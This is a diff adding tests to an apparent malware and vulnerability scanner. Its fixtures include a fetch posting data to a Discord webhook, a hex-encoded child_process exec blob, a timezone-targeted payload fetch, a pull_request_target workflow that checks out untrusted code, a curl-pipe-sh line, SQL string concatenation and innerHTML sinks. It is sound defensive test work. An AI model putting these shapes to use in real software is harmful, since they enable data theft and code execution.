@@ -785,3 +785,60 @@ test("strings built from character codes or written backwards are rebuilt before
   }), { noIgnore: true });
   assert.equal(clean.findings.filter(f => / \(hidden\)$/.test(f.title)).length, 0);
 });
+
+test("ordinary app code is not flagged: validators, locale lookups, generated data, workflow conditions", async () => {
+  const proto = Buffer.concat([Buffer.from([0x0a, 0x16]), Buffer.from("api/auth_service.proto"), Buffer.alloc(700, 7)]).toString("base64");
+  const colours = "440154".repeat(160);
+  const dir = project({
+    "package.json": JSON.stringify({ name: "app", private: true, version: "1.0.0", dependencies: { "@auth/prisma-adapter": "^2.0.0", "args-parser": "^1.3.0" } }),
+    "package-lock.json": "{}",
+    "src/rules.php": j("<?php\nif (!str_starts_with($value, 'https://discord.com/api/web", "hooks/')) { return false; }\n"),
+    "src/login.php": "<?php\nLog::debug('Login data is present.');\n",
+    "src/alerts.py": j("URL = f\"https://api.tele", "gram.org/bot{settings.TELEGRAM_TOKEN}/sendMessage\"\n"),
+    "static/signup.js": "const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;\nfetch('/signup', { method: 'POST', body: JSON.stringify({ tz }) });\n",
+    "src/gen/auth_pb.ts": `export const file = fileDesc("${proto}");\n`,
+    "src/ramps.js": `export const viridis = ramp("${colours}");\n`,
+    ".github/workflows/check-branch.yml": "on:\n  pull_request_target:\njobs:\n  check:\n    runs-on: ubuntu-latest\n    steps:\n      - if: github.head_ref != 'dev' && github.base_ref == 'main'\n        run: exit 1\n",
+    "scripts/install.sh": "#!/bin/sh\n# Usage: curl -fsSL https://example.com/install.sh | sh\necho ok\n",
+  });
+  const r = await run(dir);
+  assert.deepEqual(r.findings.filter(f => ["critical", "high", "medium"].includes(f.severity)).map(f => `${f.rule} ${f.file}:${f.line}`), []);
+  assert.ok(rules(r).has("mal-telegram-api"), "the Telegram API call stays visible at low");
+});
+
+test("the same shapes with a real target are still flagged", async () => {
+  const code = Buffer.from("require('child_process').exec('id');".repeat(30)).toString("hex");
+  const dir = project({
+    "a.js": j("fetch('https://discord.com/api/web", "hooks/1234567/abc', { method: 'POST', body: data });\n"),
+    "b.js": "if (Intl.DateTimeFormat().resolvedOptions().timeZone === 'Europe/Moscow') fetch('https://example.com/x');\n",
+    "c.js": `const blob = "${code}";\n`,
+    ".github/workflows/build.yml": "on:\n  pull_request_target:\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.head_ref }}\n      - run: npm test\n",
+  });
+  const r = await run(dir);
+  for (const id of ["mal-exfil-endpoint", "anom-targeted-payload", "mal-base64-blob", "gha-pwn-request"]) assert.ok(rules(r).has(id), id);
+});
+
+test("web patterns: helpers, text templates, fragments, tests and vendored code are not vulnerabilities", async () => {
+  const dir = project({
+    "resources/views/a.blade.php": "<div>{!! ExpandedForm::text('name') !!}</div>\n<p>{!! $note !!}</p>\n",
+    "templates/sms.html": "Check {{ check.name|safe }} is down.\n",
+    "templates/page.html": "<p>{{ snippet|safe }}</p>\n",
+    "app/views/x.html.erb": "<div>\n<%- if a -%>\n<b>x</b>\n<%- end -%>\n</div>\n",
+    "views/y.ejs": "<div><%- body %></div>\n",
+    "store/user.go": 'package store\nfunc q() {\n\tquery := "DELETE FROM users WHERE " + strings.Join(where, " AND ")\n\tbad := "SELECT * FROM users WHERE id = " + id\n}\n',
+    "tests/ui.test.js": "root.innerHTML = html;\n",
+    "public/lib/leaflet/leaflet.js": "div.innerHTML = options.html;\n",
+    "src/ui.js": "box.innerHTML = data;\n",
+  });
+  const r = await run(dir);
+  const got = r.findings.filter(f => f.category === "web").map(f => `${f.rule} ${f.severity} ${f.file}:${f.line}`).sort();
+  assert.deepEqual(got, [
+    "sql-concat high store/user.go:4",
+    "sql-fragments low store/user.go:3",
+    "xss-inner-html medium src/ui.js:1",
+    "xss-template-raw-helper low resources/views/a.blade.php:1",
+    "xss-template-unescaped medium resources/views/a.blade.php:2",
+    "xss-template-unescaped medium templates/page.html:1",
+    "xss-template-unescaped medium views/y.ejs:1",
+  ]);
+});
